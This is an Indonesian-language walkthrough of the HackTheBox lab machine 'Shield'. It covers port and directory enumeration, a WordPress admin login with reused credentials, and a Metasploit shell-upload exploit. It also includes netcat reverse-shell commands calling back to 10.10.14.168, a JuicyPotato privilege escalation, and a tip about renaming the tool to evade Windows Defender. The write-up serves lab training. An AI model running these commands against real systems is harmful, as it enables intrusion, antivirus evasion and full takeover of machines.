# shield

nmap -A -T4 -p- 10.10.10.29 -oN nmap

gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt > direnum

dapat link /wordpress/wp-admin untuk login. kemudian memasukan credential dari chall sebelumnya

```
admin
P@s5w0rd!
```

dari wordpress kita coba gunain cve dengan tools msf.

```sh
use exploit/unix/webapp/wp_admin_shell_upload

show options


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
PASSWORD => P@s5w0rd!
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.29
RHOSTS => 10.10.10.29
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

selanjutnya kita sudah mendapatkan reverse shell dari msfconsolenya

pertama kita upload file nc.exe ke windowsnya dengan command `lcd /home/kali/Desktop/netcat/`

lanjut kita upload dengan command `upload nc.exe` pastikan file nc.exe sudah berada pada path ketika kita menggunakan command lcd

selanjutnya kita bisa menjalankan nc.exe dengan command `execute -f nc.exe -a "-e cmd.exe 10.10.14.168 4333"` untuk mendapatkan reverse shell pada linux kita supaya lebih stabil.

sekarang kita cek sysinfo dari target

```
Computer    : SHIELD
OS          : Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586
Meterpreter : php/windows
```

setelah itu kita menggunakan tools juicypotato dari link `https://github.com/sebastiendamaye/hackthebox/raw/master/01-starting_point/04-Shield/files/JuicyPotato.exe` untuk priviledge escalation.

Kita kemudian mengupload dan segera merename nya supaya tidak terdeteksi oleh windows defender.

selanjutnya kita menjalankan perintah dibawah ini dan menghubungkan pada listener yang baru.

`echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.168 4222 > shell.bat`

`some.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`